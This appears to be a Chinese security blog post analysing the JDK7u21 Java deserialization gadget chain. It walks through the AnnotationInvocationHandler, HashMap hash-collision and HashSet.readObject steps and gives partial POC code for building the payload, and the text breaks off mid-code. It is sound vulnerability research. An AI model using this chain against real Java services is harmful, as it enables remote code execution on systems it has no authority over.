        <content type="html"><![CDATA[<p>文章首发于安全客：<a href="https://www.anquanke.com/post/id/247684" target="_blank" rel="noopener">https://www.anquanke.com/post/id/247684</a></p><p>最近在分析JDK7u21的Gadgets，有两个不解之处，阅读前辈们的文章发现并未提起：</p><ol><li>为什么有的POC入口是LinkedHashSet，有的是HashSet，两个都可以触发吗？</li><li>关于<code>map.put(&quot;f5a5a608&quot;, templates);</code>的位置，为什么将其放在<code>set.add(proxy);</code>前面执行会导致反序列化执行命令失败的问题？</li></ol><p>就这两个疑惑进行调试分析，有了这篇文章。</p><p>本次分析调试的POC放在最后一部分，需要的可以先copy。</p><p>接下来本文将会按照以下思路分析探讨：</p><ol><li>Gadgets链反序列化载体的分析，为上述两个问题的解答做铺垫；</li><li>两个疑惑的分析解答；</li><li>我们挖掘此类漏洞的思路。</li></ol><h3 id="一、反序列化载体分析"><a href="#一、反序列化载体分析" class="headerlink" title="一、反序列化载体分析"></a>一、反序列化载体分析</h3><p><a href="https://gist.github.com/frohoff/24af7913611f8406eaf3" target="_blank" rel="noopener">frohoff给出的Gadgets</a></p><p><img src="/imgs/image-20210713144702330.png" alt="image-20210713144702330"></p><p>命令执行载体TemplatesImpl分析过了，这里不涉及了。根据Gadgets我们知道是通过AnnotationInvocationHandler的invoke和equalsImpl调用了TemplatesImpl.getOutputProperties，那么我们先看下这部分。</p><h4 id="1、AnnotationInvocationHandler链"><a href="#1、AnnotationInvocationHandler链" class="headerlink" title="1、AnnotationInvocationHandler链"></a>1、AnnotationInvocationHandler链</h4><p>POC中创建了一个动态代理proxy，用tempHandler代理Templates接口，根据动态代理知识我们知道实际就是AnnotationInvocationHandler的invoke代理了Templates接口的两个方法newTransformer()和getOutputProperties()。</p><h5 id="1-1、AnnotationInvocationHandler-invoke"><a href="#1-1、AnnotationInvocationHandler-invoke" class="headerlink" title="1.1、AnnotationInvocationHandler.invoke()"></a>1.1、AnnotationInvocationHandler.invoke()</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// invoke传入的参数：Object proxy 代理对象, Method method 代理实例上调用的接口方法的method, Object[] args 方法的实参</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// var4即代理的方法名</span></span><br><span class="line">    String var4 = var2.getName();</span><br><span class="line">    <span class="comment">// var5即代理方法的参数数组</span></span><br><span class="line">    Class[] var5 = var2.getParameterTypes();</span><br><span class="line">    <span class="comment">// 当代理方法是equals，并且参数只有一个是Object，也就是当代理的方法是proxy.equals(Object obj)</span></span><br><span class="line">    <span class="keyword">if</span> (var4.equals(<span class="string">"equals"</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// equalsImpl传入的参数实际是代理方法的参数，如果这里传入TemplatesImpl实例，var3[0] = TemplatesImpl实例</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.equalsImpl(var3[<span class="number">0</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">......</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据动态代理相关知识，我们知道invoke()传入的参数是代理对象，被代理的方法及其参数只有在满足一定条件时（<code>var4.equals(&quot;equals&quot;) &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class</code>）会调用equalsImpl。</p><h5 id="1-2、-AnnotationInvocationHandler-equalsImpl"><a href="#1-2、-AnnotationInvocationHandler-equalsImpl" class="headerlink" title="1.2、 AnnotationInvocationHandler.equalsImpl()"></a>1.2、 AnnotationInvocationHandler.equalsImpl()</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Boolean <span class="title">equalsImpl</span><span class="params">(Object var1)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (var1 == <span class="keyword">this</span>) &#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">this</span>.type.isInstance(var1)) &#123;<span class="comment">// 根据poc这里type指的就是初始化的Templates.class</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// 传入的参数不是AnnotationInvocationHandler对象也不是Templates的实例时</span></span><br><span class="line">        <span class="comment">// getMemberMethods会获取AnnotationInvocationHandler.this.type.getDeclaredMethods()，即type属性代表的类Templates定义的方法</span></span><br><span class="line">        Method[] var2 = <span class="keyword">this</span>.getMemberMethods();</span><br><span class="line">        <span class="keyword">int</span> var3 = var2.length;</span><br><span class="line"><span class="comment">// Templates一共有2个方法newTransformer()和getOutputProperties()，循环调用所有方法</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> var4 = <span class="number">0</span>; var4 &lt; var3; ++var4) &#123;</span><br><span class="line">            <span class="comment">// method对象</span></span><br><span class="line">            Method var5 = var2[var4];</span><br><span class="line">            <span class="comment">// 获取method名称，即方法名</span></span><br><span class="line">            String var6 = var5.getName();</span><br><span class="line">            Object var7 = <span class="keyword">this</span>.memberValues.get(var6);</span><br><span class="line">            Object var8 = <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">// asOneOfUs：如果var1是动态代理类实例，并且其InvocationHandler是AnnotationInvocationHandler实例，如果不是的话，返回null</span></span><br><span class="line">            AnnotationInvocationHandler var9 = <span class="keyword">this</span>.asOneOfUs(var1);</span><br><span class="line">            <span class="keyword">if</span> (var9 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                var8 = var9.memberValues.get(var6);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; <span class="comment">// 没有var1不是InvocationHandler实例的情况</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// invoke调用方法：依次调用method.invoke，当var1是TemplatesImpl实例，就会调用TemplatesImpl.newTransformer或TemplatesImpl.getOutputProperties</span></span><br><span class="line">                    var8 = var5.invoke(var1);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InvocationTargetException var11) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IllegalAccessException var12) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(var12);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!memberValueEquals(var7, var8)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据上面代码的分析我们能得出equalsImpl传入的参数是TemplatesImpl实例，并且AnnotationInvocationHandler.type属性是TemplatesImpl.class对象，我们就能调用TemplatesImpl.newTransformer或TemplatesImpl.getOutputProperties。那么当equalsImpl传入的参数是TemplatesImpl实例时，proxy.equals(Object obj)实际就是需要传入参数就是参数类型即TemplatesImpl.class。</p><p>小结：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.invoke(Object proxy, Method method,Object[0] templatesImpl)---满足条件（proxy.equals(TemplatesImpl实例)）---&gt;AnnotationInvocationHandler.equalsImpl(Templates实例)-----&gt;TemplatesImpl.newTransformer或TemplatesImpl.getOutputProperties</span><br></pre></td></tr></table></figure><p>现在的问题是如何能满足<code>proxy.equals(TemplatesImpl实例)</code>这个条件。</p><h4 id="2、proxy-equals-TemplatesImpl实例"><a href="#2、proxy-equals-TemplatesImpl实例" class="headerlink" title="2、proxy.equals(TemplatesImpl实例)"></a>2、proxy.equals(TemplatesImpl实例)</h4><h5 id="2-1、HashMap-put"><a href="#2-1、HashMap-put" class="headerlink" title="2.1、HashMap.put()"></a>2.1、HashMap.put()</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span> putForNullKey(value);</span><br><span class="line">    <span class="comment">// 计算key的hash</span></span><br><span class="line">    <span class="keyword">int</span> hash = hash(key);</span><br><span class="line">    <span class="comment">// 返回hash在数组中的索引i</span></span><br><span class="line">    <span class="keyword">int</span> i = indexFor(hash, table.length);</span><br><span class="line">    <span class="comment">// 链表的操作，循环链表中的所有键值对</span></span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="keyword">null</span>; e = e.next) &#123;</span><br><span class="line">        Object k;</span><br><span class="line">        <span class="comment">// 条件1：当前键值对的hash == 要插入键值对的hash，条件2：当前键值对的key的值==要插入的键值对的key的值，条件3：当前要插入键值对的key.equals(当前键值对的key))</span></span><br><span class="line">        <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;</span><br><span class="line">            V oldValue = e.value;</span><br><span class="line">            e.value = value;</span><br><span class="line">            e.recordAccess(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modCount++;</span><br><span class="line">    addEntry(hash, key, value, i);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>jdk1.7的HashMap的数据结构是数组+链表，插入key-value操作：</p><ul><li>数组下标是key计算后的hash值；</li><li>数组的值是一个链表；</li><li>要插入一个新的key-value，如果key计算后的hash在数组中已经存在，则会在这个hash所在链表中插入这个value。当然插入之前要满足一个条件：插入的键值对的key不能在链表中已存在，即key的hash可以相等，但是key不能相等。</li></ul><p>所以HashMap在插入时会对key和已存在的hash进行比较，不允许相同的key的键值对重复进行插入。</p><p>这跟本次链有什么关系？</p><p>我们要找的是proxy.equals(TemplatesImpl实例)的调用，上面代码<code>if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k)))</code>当条件1满足且条件2不满足，会执行equal方法。如果要调用proxy.equals(TemplatesImpl实例)，那么需要让key=proxy，k=TemplatesImpl实例，即当前插入的键值对的key是proxy，并且需要key是TemplatesImpl实例的键值对已存在，那么我们就需要在插入的时候<strong>先插入TemplatesImpl实例再插入Proxy实例</strong>。这也说明了poc为什么要先添加TemplatesImpl实例再添加Proxy实例。</p><p>接下来的问题是怎么让条件1满足条件2不满足？</p><p>当key=proxy且k=TemplatesImpl实例时，两者一定不相等条件2满足。条件1（TemplatesImpl实例的哈希==proxy的哈希）怎么满足？</p><h5 id="2-2、TemplatesImpl实例的哈希-Proxy实例的哈希"><a href="#2-2、TemplatesImpl实例的哈希-Proxy实例的哈希" class="headerlink" title="2.2、TemplatesImpl实例的哈希==Proxy实例的哈希"></a>2.2、TemplatesImpl实例的哈希==Proxy实例的哈希</h5><p>在HashMap中计算hash会调用hash()方法：<code>int hash = hash(key);</code>，我们先来看看hash()方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (useAltHashing) &#123;</span><br><span class="line">        <span class="keyword">if</span> (k <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            <span class="keyword">return</span> sun.misc.Hashing.stringHash32((String) k);</span><br><span class="line">        &#125;</span><br><span class="line">        h = hashSeed;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//关键处</span></span><br><span class="line">    h ^= k.hashCode();</span><br><span class="line">    <span class="comment">// 这个函数确保在每个位位置仅相差常数倍的hashCodes冲突的数量有限(在默认加载因子下大约为8)。</span></span><br><span class="line">    h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>hash调用k的hashCode方法，即会调用k所代表的对象的该方法，那么我们需要看看Proxy.hashCode()和TemplatesImpl.hashCode()。</p><p>TemplatesImpl内部没有定义hashCode()，所以调用的是Object的该方法，该方法是native方法，我们无法得知细节。</p><p>Proxy内部也没有定义hashCode()，但是有这样的说明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">调用&#123;@code java.lang.Object&#125;中声明的&#123;@code hashCode&#125;、&#123;@code equals&#125;或&#123;@code toString&#125;方法。将对代理实例上的Object&#125;进行编码并将其分派给调用处理程序的&#123;@code invoke&#125;方法，其方式与接口方法调用的编码和分派方式相同，如上所述。&#123;@code Method&#125;对象传递给&#123;@code invoke&#125;的声明类将是&#123;@code java.lang.Object&#125;。代理实例的其他公共方法继承自&#123;@code java.lang。Object&#125;不会被代理类覆盖，所以这些方法的调用行为就像&#123;@code java.lang.Object&#125;实例的行为一样。</span><br><span class="line">【题外话：注解@code的使用语法&#123;@code text&#125; 被解析成&lt;code&gt;text&lt;&#x2F;code&gt;，将文本标记为代码样式的文本，在code内部可以使用 &lt; 、&gt; 等不会被解释成html标签, code标签有自己的样式。</span><br><span class="line">一般在Javadoc中只要涉及到类名或者方法名，都需要使用@code进行标记。】</span><br></pre></td></tr></table></figure><p>如果调用proxy的hashCode方法，当代理handler是AnnotationInvocationHandler对象时，proxy.hashCode会通过AnnotationInvocationHandler.invoke处理，实际上AnnotationInvocationHandler.invoke会通过AnnotationInvocationHandler.hashCodeImpl()来具体实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (var4.equals(<span class="string">"hashCode"</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.hashCodeImpl();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AnnotationInvocationHandler.hashCodeImpl()：在P神的JDK7u21文章里，特别分析了该方法，我们来看下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">hashCodeImpl</span><span class="params">()</span> </span>&#123; </span><br><span class="line"><span class="keyword">int</span> result = <span class="number">0</span>; </span><br><span class="line">    <span class="comment">// 循环memberValues的所有键值对，将键值对通过计算获取的结果进行累加。memberValues指的是AnnotationInvocationHandler实例化时传入的Map实例，&lt;"f5a5a608",TemplateImpl实例&gt;</span></span><br><span class="line"><span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; e : memberValues.entrySet()) &#123; </span><br><span class="line">result += (<span class="number">127</span> * e.getKey().hashCode()) ^ memberValueHashCode(e.getValue()); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>当 memberValues 中只有一个key和一个value时，该哈希简化成 (127 * key.hashCode()) ^ value.hashCode() 。如果key.hashCode() 等于0，任何数异或0的结果仍是他本身，那么该哈希可以简化成value.hashCode() 。 那么当value就是TemplateImpl对象时，返回的result是TemplateImpl对象的hash，那么这时候proxy.equals(TemplatesImpl实例)就是TemplateImpl对象的hash，这两个哈希就变成完全相等。</p></blockquote><p>所以key.hashCode=0，找到这个key，value是TemplateImpl实例。如何找到这个key，我们可以通过计算：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">long</span> i = <span class="number">0</span>; i &lt; <span class="number">9999999999L</span>; i++) &#123;</span><br><span class="line"><span class="comment">// 当其hashCode是0就是我们想要的结果</span></span><br><span class="line"><span class="keyword">if</span> (Long.toHexString(i).hashCode() == <span class="number">0</span>) &#123;</span><br><span class="line">System.out.println(Long.toHexString(i)); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>hash碰撞后的结果会有多个，将其中一个作为key就可以，所以针对AnnotationInvocationHandler实例化的Map对象进行插入操作即Map.put(“f5a5a608”,TemplateImpl实例)。</p><p>2.1和2.2小结：</p><p>这时候为了触发命令执行，我们就找到一条链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HashMap.put(proxy,xx)---&gt;Proxy.hashCode()---&gt;AnnotationInvocationHandler.invoke()---&gt;AnnotationInvocationHandler.hashCodeImpl()---&gt;Map.put(&quot;f5a5a608&quot;,TemplateImpl实例)满足---&gt;proxy.equals(TemplatesImpl实例)---&gt;AnnotationInvocationHandler.equalsImpl()---&gt;TemplatesImpl.getOutputProperties</span><br></pre></td></tr></table></figure><p>接下来的问题是如何能够在反序列化时调用HashMap.put(proxy,xx)？</p><h5 id="2-3、如何能够调用HashMap-put？"><a href="#2-3、如何能够调用HashMap-put？" class="headerlink" title="2.3、如何能够调用HashMap.put？"></a>2.3、如何能够调用HashMap.put？</h5><p>调用HashMap.put我们考虑HashSet，因为<strong>HashSet内部使用HashMap来存储数据</strong>，并且HashSet重写了readObject方法，既然重写了readObject那么就有可能要调用HashMap.put方法来恢复数据结构。我们来看下HashSet.readObject()：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// 调用默认反序列化方法</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    <span class="comment">// 读取HashMap容量和负载因子,并创建备份HashMap</span></span><br><span class="line">    <span class="keyword">int</span> capacity = s.readInt();</span><br><span class="line">    <span class="keyword">float</span> loadFactor = s.readFloat();</span><br><span class="line">    <span class="comment">// 判断是否是LinkedHashSet实例，如果是就实例化一个LinkedHashMap对象，否则实例化一个HashMap对象</span></span><br><span class="line">    map = (((HashSet)<span class="keyword">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">           <span class="keyword">new</span> LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">           <span class="keyword">new</span> HashMap&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取map个数</span></span><br><span class="line">    <span class="keyword">int</span> size = s.readInt();</span><br><span class="line">    <span class="comment">// 循环反序列化所有元素</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">        <span class="comment">// 按照e的原始类型反序列化，并put到hashmap</span></span><br><span class="line">        E e = (E) s.readObject();</span><br><span class="line">        map.put(e, PRESENT);<span class="comment">// 注意！！这里会调用HashMap.put</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在HashSet.readObject()中读取每个entry后会将其put到HashMap中，因此只要我们序列化一个HashSet，反序列化时就会调用HashMap.put()。</p><p>另外需要注意一点，HashSet.add()在添加元素时，实际调用了HashMap的put方法，将传入的参数作为key，value是一个常量，所以我们在调用HashSet.add(e)，添加的元素e实际都是HashMap的key，这也跟前面的2.1的put的<strong>key</strong>对上了，add添加的就是TemplateImpl实例和Proxy实例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// add的e就是HashMap键值对的key</span></span><br><span class="line"><span class="keyword">return</span> map.put(e, PRESENT)==<span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么到这里，我们就可以构造完整的执行链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HashSet.readObject()---&gt;HashMap.put(proxy,xx)---&gt;Proxy.hashCode()---&gt;AnnotationInvocationHandler.invoke()---&gt;AnnotationInvocationHandler.hashCodeImpl()---&gt;Map.put(&quot;f5a5a608&quot;,TemplateImpl实例)满足---&gt;proxy.equals(TemplatesImpl实例)---&gt;AnnotationInvocationHandler.equalsImpl()---&gt;TemplatesImpl.getOutputProperties</span><br></pre></td></tr></table></figure><h4 id="3、为什么有的POC入口是LinkedHashSet，有的是HashSet？"><a href="#3、为什么有的POC入口是LinkedHashSet，有的是HashSet？" class="headerlink" title="3、为什么有的POC入口是LinkedHashSet，有的是HashSet？"></a>3、为什么有的POC入口是LinkedHashSet，有的是HashSet？</h4><p>我看到有些分析文章提到了需要用LinkedHashSet而不是HashSet，因为LinkedHashSet是有序的HashSet是无序的。其实两个都可以作为入口点，不论LinkedHashSet还是HashSet，主要跟<strong>反序列化时在HashSet.readObject中调用map.put插入TemplatesImpl实例和Proxy实例前后顺序</strong>有关系，因为需要HashMap.put插入时的比较操作来触发命令执行，当插入Proxy实例需要TemplatesImpl实例已经存在才能调用proxy.equals(templatesimpl)，这里不懂可以回到2.1再理解下。</p><p>LinkedHashSet可以保证我们的添加时候的顺序和反序列化时候的顺序一致，但是HashSet是无序的，不能保证这一点，那么我们如何让HashSet也满足反序列化时先读取TemplatesImpl实例再读取Proxy实例？</p><p>答案如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">HashSet set = <span class="keyword">new</span> HashSet();</span><br><span class="line">map.put(<span class="string">"f5a5a608"</span>, <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;-<span class="number">16</span>&#125;);</span><br><span class="line">set.add(proxy);</span><br><span class="line">set.add(templates);</span><br><span class="line">map.put(<span class="string">"f5a5a608"</span>, templates);</span><br></pre></td></tr></table></figure><p>我们知道HashMap的数据结构是数组+链表，虽然它的插入是无序的，但是它迭代读取所有元素时还是会按照数组下标顺序来，那么我们只要让Proxy实例所在的数组索引大于Template实例所在数组索引就可以满足条件。HashMap初始长度为16，当proxy在最大下标15时就可以满足这个条件。我们知道proxy.hash可以根据AnnotationInvocationHandler.hashCodeImpl进行计算，AnnotationInvocationHandler.hashCodeImpl时根据map来计算的，map我们可控。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1、计算数据索引index</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">indexFor</span><span class="params">(<span class="keyword">int</span> h, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> h &amp; (length-<span class="number">1</span>); <span class="comment">// h =15，15 &amp; 15 =15</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2、计算hash</span></span><br><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (useAltHashing) &#123;</span><br><span class="line">        <span class="keyword">if</span> (k <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            <span class="keyword">return</span> sun.misc.Hashing.stringHash32((String) k);</span><br><span class="line">        &#125;</span><br><span class="line">        h = hashSeed;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// proxy.hashCode最终是AnnotationInvocationHandler.hashCodeImpl计算的结果</span></span><br><span class="line">    h ^= k.hashCode();</span><br><span class="line">    </span><br><span class="line">    h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>); <span class="comment">// 返回需要是15</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据上面代码我们来反推下map需要put的键值对。</p><ol><li>下标indexFor根据hash和容量计算，那么proxy.hash需要是15；</li><li>如何让proxy.hash=15？我们让hash(proxy)的结果是15就可以让indexFor是15，那么最终hash里面<code>h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4)</code>的值需要等于15；</li><li>那么proxy.hashCode值是多少能让其hash(proxy)是15？我们可以通过计算：</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">caculate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>;i++)&#123;</span><br><span class="line">        <span class="comment">// 将上面计算hash代码拿下来，单独计算下</span></span><br><span class="line">        <span class="keyword">int</span> h =<span class="number">0</span>;</span><br><span class="line">        h ^= i;</span><br><span class="line">        h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; 